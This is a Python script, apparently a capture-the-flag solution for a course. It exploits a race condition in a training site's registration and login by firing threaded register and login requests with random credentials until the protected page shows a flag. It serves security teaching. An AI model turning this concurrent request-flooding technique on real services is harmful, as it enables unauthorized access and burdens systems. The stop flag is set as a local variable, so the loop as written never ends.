import requests
import string
import random
import sys
import threading
import time
import IPython

# This script follows the line of the one done in class for race condition

# Base url of the website
EP = 'http://actf.jinblack.it:4007/'
finish = False

# Generate random strings for username and pwd
def rand_string(N=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

# Registration request
def register(u,p_1,p_2):
    url = "%s/register.php" % EP
    data = {"username":u, "password_1": p_1, "password_2": p_2, "reg_user": ""}
    r = requests.post(url, data = data)

    if "Completed!" in r.text:
        return True
    return False

# Login request
def login(u, p):
    # Necessary to keep the session open
    with requests.Session() as session:
        url = "%s/login.php" % EP
        url_2 = "%s/index.php" % EP
        data = {"username":u, "password": p, "log_user": ""}
        r = session.post(url, data = data)

        if "Completed!" in r.text:

            # Challenge request
            r_2 = session.get(url_2)

            # If there is "flag{" in the response, print it and stop the while
            if "flag{" in r_2.text:
                print(r_2.text)
                finish = True

#untill we win
while True:
    if finish:
        break
    u = rand_string()
    p = rand_string()

    # Generating threads for generating cuncurrency
    r = threading.Thread(target=register, args=(u, p, p))
    r.start()

    l = threading.Thread(target=login, args=(u, p))
    l.start()

    time.sleep(0.1)
